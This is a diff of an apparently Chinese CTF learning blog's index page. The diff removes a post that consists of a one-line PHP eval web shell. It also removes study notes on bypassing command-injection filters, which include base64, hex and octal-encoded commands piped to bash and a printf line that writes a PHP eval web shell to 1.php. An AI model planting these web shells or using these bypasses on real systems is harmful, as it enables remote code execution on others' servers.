@@ -185,64 +185,6 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/21/test-php/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="MirRoR4s">
-      <meta itemprop="description" content="想成为c++专家 黑客 密码学爱好者">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="学习记录">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/04/21/test-php/" class="post-title-link" itemprop="url">未命名</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-04-21 21:53:47 / 修改时间：21:54:22" itemprop="dateCreated datePublished" datetime="2022-04-21T21:53:47+08:00">2022-04-21</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <?php eval($_POST['hh']);?>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -268,7 +210,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2022-04-21 20:52:53 / 修改时间：21:13:18" itemprop="dateCreated datePublished" datetime="2022-04-21T20:52:53+08:00">2022-04-21</time>
+              <time title="创建时间：2022-04-21 20:52:53 / 修改时间：22:00:13" itemprop="dateCreated datePublished" datetime="2022-04-21T20:52:53+08:00">2022-04-21</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -291,58 +233,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <span id="more"></span>
-
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39877898/article/details/112198269">https://blog.csdn.net/weixin_39877898/article/details/112198269</a></p>
-<h2 id="0x00-一些绕过姿势"><a href="#0x00-一些绕过姿势" class="headerlink" title="0x00:一些绕过姿势"></a>0x00:一些绕过姿势</h2><p>在遇到的一些web题中，会经常将以下几种给过滤或者进行限制：</p>
-<ol>
-<li>空格</li>
-<li>命令<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%88%86%E9%9A%94%E7%AC%A6&spm=1001.2101.3001.7020">分隔符</a></li>
-<li>关键字</li>
-<li>限制长度</li>
-<li>限制回显</li>
-</ol>
-<h2 id="1-空格绕过"><a href="#1-空格绕过" class="headerlink" title="1.空格绕过"></a>1.空格绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">常见的绕过符号有：</span><br><span class="line">$IFS$9</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">%09(php环境下)</span><br><span class="line">重定向符&lt;&gt;</span><br><span class="line">#$IFS在linux下表示分隔符，如果不加&#123;&#125;则bash会将IFS解释为一个变量名，</span><br><span class="line"></span><br><span class="line">加一个&#123;&#125;就固定了变量名，$IFS$9后面之所以加个$是为了起到截断的作用</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="2-命令分隔符"><a href="#2-命令分隔符" class="headerlink" title="2.命令分隔符"></a>2.命令分隔符</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">%0a --换行符，需要php环境</span><br><span class="line">%0d --回车符，需要php环境</span><br><span class="line">; --在shell中，是连续指令</span><br><span class="line">&amp; --不管第一条命令成功与否，都会执行第二条命令</span><br><span class="line">&amp;&amp; --第一条命令执行成功，第二条才会执行</span><br><span class="line">| --第一条命令的结果，作为第二条命令的输入</span><br><span class="line">|| --第一条命令失败，第二条才会执行</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h2><p>假如过滤了关键字cat flag ,该如何绕过？</p>
-<p>1.拼接绕过法：<br>#执行ls命令：<br>a&#x3D;l;b&#x3D;s;$a$b</p>
-<p>#cat flag文件内容：<br>a&#x3D;c;b&#x3D;at;c&#x3D;f;d&#x3D;lag;$a$b ${c}${d}</p>
-<p>#cat test文件内容</p>
-<p>a&#x3D;”ccaatt”;b&#x3D;${a:0:1}${a:2:1}${a:4:1};$b test</p>
-<p>2.编码绕过法：<br>#base64<br>echo “Y2F0IC9mbGFn”|base64 -d|bash &#x3D;&#x3D;&gt;cat &#x2F;flag<br>echo Y2F0IC9mbGFn|base64 -d|sh&#x3D;&#x3D;&gt;cat &#x2F;flag</p>
-<p>#hex<br>echo “0x636174202f666c6167” | xxd -r -p|bash &#x3D;&#x3D;&gt;cat &#x2F;flag</p>
-<p>#oct&#x2F;字节</p>
-<p>$(printf “\154\163”) &#x3D;&#x3D;&gt;ls</p>
-<p>$(printf “\x63\x61\x74\x20\x2f\x66\x6c\x61\x67”) &#x3D;&#x3D;&gt;cat &#x2F;flag</p>
-<p>{printf,”\x63\x61\x74\x20\x2f\x66\x6c\x61\x67”}|$0 &#x3D;&#x3D;&gt;cat &#x2F;flag</p>
-<p>#i也可以通过这种方式写马</p>
-<p>内容为php @eval($_POST[‘c’]);?&gt;</p>
-<p>${printf,”\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76”} &gt;&gt; 1.php</p>
-<p>3.单引号和双引号绕过<br>c’a’t test<br>c”a”t test</p>
-<p>4.反斜杠绕过<br>ca\t test</p>
-<p>5.通过$PATH绕过<br>#echo $PATH 显示当前PATH环境变量，该变量的值由一系列以冒号分隔的目录名组成</p>
-<p>#当执行程序时，shell自动跟据PATH变量的值去搜索该程序</p>
-<p>#shell在搜索时先搜索PATH环境变量中的第一个目录，没找到再接着搜索，如果找到则执行它，不会再继续搜索</p>
-<p>echo $PATH</p>
-<p>&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin</p>
-<p><code>echo $PATH| cut -c 8,9</code>t test</p>
-<p>注意反引号不要遗漏，cut -c 8,9的输出结果是ca</p>
-<p>6.通配符绕过<br>[…]表示匹配方括号之中的任意一个字符</p>
-<p>{…}表示匹配大括号里面的所有模式，模式之间使用逗号分隔。<br>{…}与[…]有一个重要的区别，当匹配的文件不存在，[…]会失去模式的功能，变成一个单纯的字符串，而{…}依然可以展开,见下图</p>
-<p><img src="/../images/1650546639749.png" alt="1650546639749"></p>
-<p>cat t?st<br>cat te*<br>cat t[a-z]st<br>cat t{a,b,c,d,e,f}st</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#linux中查看文件内容的命令</span><br><span class="line">cat、tac、more、less、head、tail、nl、sed、sort、uniq</span><br></pre></td></tr></table></figure>
-
-
-
-<p>内联执行：将反引号内命令的输出作为输入执行。</p>
-
+          <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39877898/article/details/112198269">https://blog.csdn.net/weixin_39877898/article/details/112198269</a></p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/04/21/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -588,6 +487,87 @@
   
   
 
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/15/%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E5%88%86%E6%B2%BB%E7%AD%96%E7%95%A5%E4%B9%8B%E6%9C%80%E5%A4%A7%E5%AD%90%E6%95%B0%E7%BB%84/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="MirRoR4s">
+      <meta itemprop="description" content="想成为c++专家 黑客 密码学爱好者">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="学习记录">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/04/15/%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E5%88%86%E6%B2%BB%E7%AD%96%E7%95%A5%E4%B9%8B%E6%9C%80%E5%A4%A7%E5%AD%90%E6%95%B0%E7%BB%84/" class="post-title-link" itemprop="url">算法导论第四章分治策略之最大子数组</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-04-15 20:17:02" itemprop="dateCreated datePublished" datetime="2022-04-15T20:17:02+08:00">2022-04-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-04-18 21:32:55" itemprop="dateModified" datetime="2022-04-18T21:32:55+08:00">2022-04-18</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%AE%97%E6%B3%95/" itemprop="url" rel="index"><span itemprop="name">算法</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>浅谈自己对最大子数组的理解</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/04/15/%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA%E7%AC%AC%E5%9B%9B%E7%AB%A0%E5%88%86%E6%B2%BB%E7%AD%96%E7%95%A5%E4%B9%8B%E6%9C%80%E5%A4%A7%E5%AD%90%E6%95%B0%E7%BB%84/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
 
   
   <nav class="pagination">
@@ -657,7 +637,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-count">7</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
